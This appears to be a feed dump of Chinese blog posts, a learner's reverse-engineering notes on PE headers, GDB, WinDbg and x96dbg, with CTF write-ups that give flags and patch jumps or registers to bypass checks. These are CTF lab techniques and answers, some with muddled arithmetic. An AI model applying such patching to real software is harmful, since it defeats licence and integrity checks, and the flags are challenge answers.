title="可执行文件头"></a>可执行文件头</h2><p>DOS头和NT头就是PE文件中两个重要的文件头。</p><h2 id="一、DOS头"><a href="#一、DOS头" class="headerlink" title="一、DOS头"></a>一、DOS头</h2><p>主要是兼容，对于32位PE文件来说，DOS所起的作用就是显示一行文字，提示用户：我需要在32位windows上才可以运行。我认为这是个善意的玩笑，因为他并不像显示的那样不能运行，其实已经运行了，只是在DOS上没有干用户希望看到的工作而已，好吧，我承认这不是重点。但是，至少我们看一下这个头是如何定义的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span> <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD e_magic; <span class="comment">// Magic number</span></span><br><span class="line">    WORD e_cblp; <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD e_cp; <span class="comment">// Pages in file</span></span><br><span class="line">    WORD e_crlc; <span class="comment">// Relocations</span></span><br><span class="line">    WORD e_cparhdr; <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD e_minalloc; <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD e_maxalloc; <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD e_ss; <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD e_sp; <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD e_csum; <span class="comment">// Checksum</span></span><br><span class="line">    WORD e_ip; <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD e_cs; <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD e_lfarlc; <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD e_ovno; <span class="comment">// Overlay number</span></span><br><span class="line">    WORD e_res[<span class="number">4</span>]; <span class="comment">// Reserved words</span></span><br><span class="line">    WORD e_oemid; <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD e_oeminfo; <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD e_res2[<span class="number">10</span>]; <span class="comment">// Reserved words</span></span><br><span class="line">    LONG e_lfanew; <span class="comment">// File address of new exe header</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>需要关注的就2个地方</p><ol><li> e_magic：一个WORD类型，值是一个常数0x4D5A，用文本编辑器查看该值位‘MZ’，可执行文件必须都</li></ol><p>   是’MZ’开头</p><ol start="2"><li>  e_lfanew：为32位可执行文件扩展的域，用来表示DOS头之后的NT头相对文件起始地址的偏移。</li></ol><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523140957251.png" alt="image-20230523140957251"></p><h2 id="二-NT头"><a href="#二-NT头" class="headerlink" title="二.NT头"></a>二.NT头</h2><p>顺着 e_lfanew 很容易就能找到NT头，这个才是32位PE文件中最有用的头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>我们可以通过010里面的模块来分析文件，</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523143737562.png" alt="image-20230523143737562"></p><h1 id="2-PE字段简介"><a href="#2-PE字段简介" class="headerlink" title="2.PE字段简介"></a>2.PE字段简介</h1><p>用PEtools 这个工具</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523152936812.png" alt="image-20230523152936812"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153027058.png" alt="image-20230523153027058"></p><hr><p>贼多嘞，后面在学吧   《windows PE 权威指南》</p><h1 id="3-PE节表"><a href="#3-PE节表" class="headerlink" title="3.PE节表"></a>3.PE节表</h1><p>节表位置的计算：DOS头大小+标准PE头大小+标准PE头SizeofoftimHeader的值</p><p>FileBuffer 是从硬盘读到内存的缓存</p><p>ImageBuffer（映像或镜像）是把内存中的FileBuffer拉伸后的结果</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153646466.png" alt="image-20230523153646466"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153657361.png" alt="image-20230523153657361"></p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230523153705486.png" alt="image-20230523153705486"></p><p><strong>节表</strong> <strong>VirtualAddress</strong> <strong>属性的意思</strong></p><p>真实代码的大小，包括为初始化数据的大小，例如 char a[100] ,a数组没有初始化数据，但是还是要算100字节大小，</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153723175.png" alt="image-20230523153723175"></p><p><strong>节表****SizeOfRawData</strong> <strong>属性的意思</strong></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153736676.png" alt="image-20230523153736676"></p><p><strong>节表</strong> <strong>PointerToRawData****属性</strong></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153748695.png" alt="image-20230523153748695"></p><p><strong>Characteristics</strong> <strong>节的属性</strong></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230523153759721.png" alt="image-20230523153759721"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">标志(属性块) 常用特征值对照表：</span><br><span class="line">[值:<span class="number">00000020</span>h] [IMAGE_SCN_CNT_CODE <span class="comment">// Section contains code.(包含可</span></span><br><span class="line">执行代码)]</span><br><span class="line">[值:<span class="number">00000040</span>h] [IMAGE_SCN_CNT_INITIALIZED_DATA <span class="comment">// Section contains initialized</span></span><br><span class="line">data.(该块包含已初始化的数据)]</span><br><span class="line">[值:<span class="number">00000080</span>h] [IMAGE_SCN_CNT_UNINITIALIZED_DATA <span class="comment">// Section contains</span></span><br><span class="line">uninitialized data.(该块包含未初始化的数据)]</span><br><span class="line">[值:<span class="number">00000200</span>h] [IMAGE_SCN_LNK_INFO <span class="comment">// Section contains comments or</span></span><br><span class="line">some other type of information.]</span><br><span class="line">[值:<span class="number">00000800</span>h] [IMAGE_SCN_LNK_REMOVE <span class="comment">// Section contents will not</span></span><br><span class="line">become part of image.]</span><br><span class="line">[值:<span class="number">00001000</span>h] [IMAGE_SCN_LNK_COMDAT <span class="comment">// Section contents comdat.]</span></span><br><span class="line">[值:<span class="number">00004000</span>h] [IMAGE_SCN_NO_DEFER_SPEC_EXC <span class="comment">// Reset speculative exceptions</span></span><br><span class="line">handling bits in the TLB entries <span class="keyword">for</span> this section.]</span><br><span class="line">[值:<span class="number">00008000</span>h] [IMAGE_SCN_GPREL <span class="comment">// Section content can be</span></span><br><span class="line">accessed relative to GP.]</span><br><span class="line">[值:<span class="number">00500000</span>h] [IMAGE_SCN_ALIGN_16BYTES <span class="comment">// Default alignment if no</span></span><br><span class="line">others are specified.]</span><br><span class="line">[值:<span class="number">01000000</span>h] [IMAGE_SCN_LNK_NRELOC_OVFL <span class="comment">// Section contains extended</span></span><br><span class="line">relocations.]</span><br><span class="line">[值:<span class="number">02000000</span>h] [IMAGE_SCN_MEM_DISCARDABLE <span class="comment">// Section can be discarded.]</span></span><br><span class="line">[值:<span class="number">04000000</span>h] [IMAGE_SCN_MEM_NOT_CACHED <span class="comment">// Section is not cachable.]</span></span><br><span class="line">[值:<span class="number">08000000</span>h] [IMAGE_SCN_MEM_NOT_PAGED <span class="comment">// Section is not pageable.]</span></span><br><span class="line">[值:<span class="number">10000000</span>h] [IMAGE_SCN_MEM_SHARED <span class="comment">// Section is shareable(该块为共</span></span><br><span class="line">享块).]</span><br><span class="line">[值:<span class="number">20000000</span>h] [IMAGE_SCN_MEM_EXECUTE <span class="comment">// Section is executable.(该块可</span></span><br><span class="line">执行)]</span><br><span class="line">[值:<span class="number">40000000</span>h] [IMAGE_SCN_MEM_READ <span class="comment">// Section is readable.(该块可</span></span><br><span class="line">读)]</span><br><span class="line">[值:<span class="number">80000000</span>h] [IMAGE_SCN_MEM_WRITE <span class="comment">// Section is writeable.(该块可</span></span><br><span class="line">写)]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GBD插件（27）</title>
      <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-27-GDB%E6%8F%92%E4%BB%B6/"/>
      <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-27-GDB%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>主要就是方便了linux 下的调试工具…</p><p>不是很会用</p><p>有3个插件</p><p><a href="https://blog.csdn.net/gatieme/article/details/63254211">https://blog.csdn.net/gatieme/article/details/63254211</a></p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230521234013967.png" alt="image-20230521234013967"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-新年快乐（5）</title>
      <link href="/2023/05/21/Re%E5%88%B7%E9%A2%98%E5%92%AF-5-BUU-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/"/>
      <url>/2023/05/21/Re%E5%88%B7%E9%A2%98%E5%92%AF-5-BUU-%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/</url>
      
        <content type="html"><![CDATA[<h5 id="首先用exeinfope-exe来查看壳"><a href="#首先用exeinfope-exe来查看壳" class="headerlink" title="首先用exeinfope.exe来查看壳"></a>首先用exeinfope.exe来查看壳</h5><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230418101111042.png" alt="image-20230418101111042"></p><h5 id="讲实话，看不懂只知道了是32位的，直接放入ida中…"><a href="#讲实话，看不懂只知道了是32位的，直接放入ida中…" class="headerlink" title="讲实话，看不懂只知道了是32位的，直接放入ida中…"></a>讲实话，看不懂只知道了是32位的，直接放入ida中…</h5><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230418101343245.png" alt="image-20230418101343245"></p><h5 id="很明显，这有问题。"><a href="#很明显，这有问题。" class="headerlink" title="很明显，这有问题。"></a>很明显，这有问题。</h5><h5 id="有问题当然要百度啦！"><a href="#有问题当然要百度啦！" class="headerlink" title="有问题当然要百度啦！"></a>有问题当然要百度啦！</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ESP定律]以及UPX壳的特性</span><br></pre></td></tr></table></figure><h5 id="在上面的查壳的时候，发现确实有一个upx的东西"><a href="#在上面的查壳的时候，发现确实有一个upx的东西" class="headerlink" title="在上面的查壳的时候，发现确实有一个upx的东西"></a>在上面的查壳的时候，发现确实有一个upx的东西</h5><h5 id="ok，现在的问题就是脱壳咯"><a href="#ok，现在的问题就是脱壳咯" class="headerlink" title="ok，现在的问题就是脱壳咯"></a>ok，现在的问题就是脱壳咯</h5><h5 id="拖完壳后，放入ida中"><a href="#拖完壳后，放入ida中" class="headerlink" title="拖完壳后，放入ida中"></a>拖完壳后，放入ida中</h5><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230418200741410.png" alt="image-20230418200741410"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;HappyNewYear!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-内涵的软件（4）</title>
      <link href="/2023/05/21/Re%E5%88%B7%E9%A2%98%E5%92%AF-4-BUU-%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6/"/>
      <url>/2023/05/21/Re%E5%88%B7%E9%A2%98%E5%92%AF-4-BUU-%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>flag{49d3c93df25caad81232130f3d2ebfad}</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230418093430783.png" alt="image-20230418093430783"></p><h5 id="进来没有任何思路，它定义了一些东西过后就进行了跳转。我们跟上看看"><a href="#进来没有任何思路，它定义了一些东西过后就进行了跳转。我们跟上看看" class="headerlink" title="进来没有任何思路，它定义了一些东西过后就进行了跳转。我们跟上看看"></a>进来没有任何思路，它定义了一些东西过后就进行了跳转。我们跟上看看</h5><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230418093748609.png" alt="image-20230418093748609"></p><h5 id="emmm，看着像flag-提交了一下就对了……"><a href="#emmm，看着像flag-提交了一下就对了……" class="headerlink" title="emmm，看着像flag 提交了一下就对了……"></a>emmm，看着像flag 提交了一下就对了……</h5><h5 id="看看其他的吧，全是跳转，蒙蔽得很"><a href="#看看其他的吧，全是跳转，蒙蔽得很" class="headerlink" title="看看其他的吧，全是跳转，蒙蔽得很"></a>看看其他的吧，全是跳转，蒙蔽得很</h5>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux动态调试之GDB（26）</title>
      <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-26-Linux%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A5%9E%E5%99%A8%E4%B9%8BGDB%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-26-Linux%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A5%9E%E5%99%A8%E4%B9%8BGDB%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux动态调试神器之GDB简介及使用"><a href="#Linux动态调试神器之GDB简介及使用" class="headerlink" title="Linux动态调试神器之GDB简介及使用"></a>Linux动态调试神器之GDB简介及使用</h1><h2 id="GDB简介"><a href="#GDB简介" class="headerlink" title="GDB简介"></a>GDB简介</h2><p>这个是在Linux下的一个动态调试，和OD功能上应该差不多。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li><p>和OD差不多，但是看不到原文，所以要和IDA一起用</p></li><li><p>暂停【然后调试】</p></li><li><p>除此之外，GDB还具有一些独具特色的功能，如命令自动补全功能、命令</p><p>行编辑功能、面向对象语言支持（如C++）、多线程支持等。</p></li></ul><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb hero</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521190849865.png" alt="image-20230521190849865" style="zoom:50%;" /><h3 id="quit"><a href="#quit" class="headerlink" title="quit"></a>quit</h3><p>退出</p><p>也可以用 ctrl+ c【一个消耗时间的】或者 ctrl + d【就是退出，相当于quit】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521191003690.png" alt="image-20230521191003690"></p><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p>可以使用help命令，来得到GDB的帮助信息。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521191302618.png" alt="image-20230521191302618" style="zoom:50%;" /><p>这个help 会大概列出来</p><p>然后可以选中一个再help 就可以看到详细的内容。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521192410070.png" alt="image-20230521192410070" style="zoom:50%;" /><h1 id="网鼎杯2020真题-hero"><a href="#网鼎杯2020真题-hero" class="headerlink" title="网鼎杯2020真题-hero"></a>网鼎杯2020真题-hero</h1><p>首先用010 打开看看</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521195516646.png" alt="image-20230521195516646" style="zoom:50%;" /><p>发现是一个elf 文件，去kali里面运行一下</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521195546759.png" alt="image-20230521195546759" style="zoom:50%;" /><p>发现大致就是一个闯关打boss的，应该是只要通关就可以得到flag</p><p>放入IDA中看看</p><p>通过这个字符串搜索找到这个位置</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521200757904.png" alt="image-20230521200757904"></p><p>应该就是这里，然后F5一下</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521200941100.png" alt="image-20230521200941100"></p><p>这里大概就是能打过boss的战斗力</p><p>10000/30000/50000</p><p>….</p><p>然后找到</p><p>每一个跳转语句</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521201204657.png" alt="image-20230521201204657"></p><p>知道这个就是一个cmp eax和10000/30000/50000相互比较</p><p>得到的地址：</p><p>.text:000000000040165C</p><p>.text:00000000004016BC</p><p>.text:00000000004015F9</p><p>讲实话，如果是在OD里面我可以直接把flag中的值改掉，直接就不跳转。应该思路没啥问题。</p><p>这里我们也可以手动设置eax中的值的大小</p><p>然后在gdb 中 在这三个地方设置断点</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521202016922.png" alt="image-20230521202016922" style="zoom:50%;" /><p>用b 来设置断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0x4015F9 b *0x40165C b *0x4016BC</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521202403684.png" alt="image-20230521202403684"></p><h2 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h2><p>然后就是，运行过去，然后设置eax中的值，让它大于500000就好了</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521202536717.png" alt="image-20230521202536717" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521202918567.png" alt="image-20230521202918567" style="zoom:50%;" /><p>ok 打赢了怪兽</p><h2 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h2><p>整数溢出</p><p>【百度】</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521203223629.png" alt="image-20230521203223629" style="zoom:50%;" /><p>由于这段代码出现的问题</p><p>它写的是%d</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521203718500.png" alt="image-20230521203718500" style="zoom:50%;" /><p>所以int形的</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521203735233.png" alt="image-20230521203735233"></p><p>是一种int 形式的，并且攻击力和硬币都是由于v1来控制的。所以</p><p>int 型表示的十进制数据范围是-2147483648-2147483647 ，当v2&gt;2147483647时会造成整数溢出，溢</p><p>出后就会变为负数。故当v2 mod 2147483647时，能够执行充值硬币和攻击力，即(coin -2 x v2) mod</p><p>2147483648 &lt;= 2147483647 。</p><p>当v2 mod 2147483648 &gt;= 107374183647 时可执行 elf += v2 ，coin += v3</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230521204410174.png" alt="image-20230521204410174"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windbg（25）</title>
      <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-25-Windbg-%E5%92%8C-Windbg-preview%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-25-Windbg-%E5%92%8C-Windbg-preview%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="Windbg与Windbg-preview简介及使用"><a href="#Windbg与Windbg-preview简介及使用" class="headerlink" title="Windbg与Windbg preview简介及使用"></a>Windbg与Windbg preview简介及使用</h1><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p><strong>windbg</strong></p><p>是在windows平台下，强大的用户态和内核态调试工具</p><p><strong>dmp</strong></p><p>内存映像文件，一般是系统错误产生的文件</p><p><strong>pbd</strong></p><p>程序数据库文件</p><p><strong>symbol</strong></p><p>符号文件（symbol files）是一个数据信息文件，它包含了应用程序二进制文件（比如：exe，dll）调试信息</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>windbg 比 vs 在体型下小，在调试功能上强大。</p><p>windbg 还可以用来分析dump 数据 ，还可以调试进程死锁之类的。支持命令的方式。</p><p>《Windows用户态程序高效排错》《Windows高级调试》《软件调试》，有机会读读书。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>csdn 下载</p><p>…</p><p>以后再说吧。现在不想下。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>x_96_dbg介绍（24）</title>
      <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-24-x-96-dbg%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-24-x-96-dbg%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="X96-dbg简介及基本操作"><a href="#X96-dbg简介及基本操作" class="headerlink" title="X96_dbg简介及基本操作"></a>X96_dbg简介及基本操作</h1><p>由于od 只能 调试32位的。所以对于64位的就不好操作了。</p><p>自然就有x96DBG出来了，分为X32 和 X64 22两种</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>基本和OD一样</p><p>Ctrl+F9: 执行到函数返回处，用于跳出函数实现</p><p>Alt+F9:执行到用户代码，用于快速跳出系统函数</p><p>Ctrl+G:输入十六进制地址，快速定位到该地址处</p><h1 id="实战一下"><a href="#实战一下" class="headerlink" title="实战一下"></a>实战一下</h1><p>也就是一个猜数字游戏，只要一次猜对就可以得到flag</p><p>很简单</p><p>有2种方法，第一种就是直接改flag寄存器,控制跳转。</p><p>还有一个就是，它的判断跳转语句 直接改成  jmp +  “猜对了”</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-reverse_2（3）</title>
      <link href="/2023/05/18/Re%E5%88%B7%E9%A2%98%E5%92%AF-3-BUU-reverse-2/"/>
      <url>/2023/05/18/Re%E5%88%B7%E9%A2%98%E5%92%AF-3-BUU-reverse-2/</url>
      
        <content type="html"><![CDATA[<h5 id="这道题和【reverse-1】的思路是一样的，找到flag的位置，看代码"><a href="#这道题和【reverse-1】的思路是一样的，找到flag的位置，看代码" class="headerlink" title="这道题和【reverse_1】的思路是一样的，找到flag的位置，看代码"></a>这道题和【reverse_1】的思路是一样的，找到flag的位置，看代码</h5><h5 id="有一点不同就是，下下来的时候是没有后缀的，需要人为的给上-exe的后缀"><a href="#有一点不同就是，下下来的时候是没有后缀的，需要人为的给上-exe的后缀" class="headerlink" title="有一点不同就是，下下来的时候是没有后缀的，需要人为的给上.exe的后缀"></a>有一点不同就是，下下来的时候是没有后缀的，需要人为的给上.exe的后缀</h5><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230415222706104.png" alt="image-20230415222706104"></p><h5 id="然后去看flag，把里面的-i和r变成1就好了"><a href="#然后去看flag，把里面的-i和r变成1就好了" class="headerlink" title="然后去看flag，把里面的 i和r变成1就好了"></a>然后去看flag，把里面的 i和r变成1就好了</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hack1ng_fo1_fun&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OD实战训练分析解密算法（23）</title>
      <link href="/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-23-OD%E5%AE%9E%E6%88%98%E8%AE%AD%E7%BB%83%E5%88%86%E6%9E%90%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-23-OD%E5%AE%9E%E6%88%98%E8%AE%AD%E7%BB%83%E5%88%86%E6%9E%90%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>本题来自Buuctf 中的 crackMe。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518220305304.png" alt="image-20230518220305304" style="zoom:50%;" /><hr><p>小张从网上下载到一个黑客软件，然而开发者并不打算共享，所以小张注册了一个用户名叫welcomebeijing，但是密码需要进行逆向计算，请求出密码，进行MD5的32位小写哈希，进行提交。 </p><hr><p>下载下来。运行一下。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518220532525.png" alt="image-20230518220532525" style="zoom:50%;" /><p>由于题目中说了“一个用户名叫welcomebeijing”，但是不知道密码，但是知道“密码需要进行逆向计算，请求出密码，进行MD5的32位小写哈希”</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518220657978.png" alt="image-20230518220657978" style="zoom:50%;" /><p>无壳..放入IDA中看看咯</p><p>刚刚放进去</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518220847832.png" alt="image-20230518220847832" style="zoom:50%;" /><p>就看到这个come one ！感觉地方已经找到了。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518221147605.png" alt="image-20230518221147605" style="zoom:50%;" /><p>这里v6就是账号，v7是密码。</p><hr><p>【这里有一个memset函数】虽然感觉分析它用处不大，但毕竟是为了学习，何乐而不为呢？</p><p>C 库函数 <strong>void *memset(void *str, int c, size_t n)</strong> 复制字符 <strong>c</strong>（一个无符号字符）到参数 <strong>str</strong> 所指向的字符串的前 <strong>n</strong> 个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">   char str[50];</span><br><span class="line"> </span><br><span class="line">   strcpy(str,&quot;This is string.h library function&quot;);</span><br><span class="line">   puts(str);</span><br><span class="line"> </span><br><span class="line">   memset(str,&#x27;$&#x27;,7);</span><br><span class="line">   puts(str);</span><br><span class="line">   </span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后得到的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is string.h library function</span><br><span class="line">$$$$$$$ string.h library function</span><br></pre></td></tr></table></figure><p>memset(v6, 0, sizeof(v6));这个意思就是填充成0咯</p><hr><p>点进去看一看这个对账号密码处理的函数</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518222948163.png" alt="image-20230518222948163" 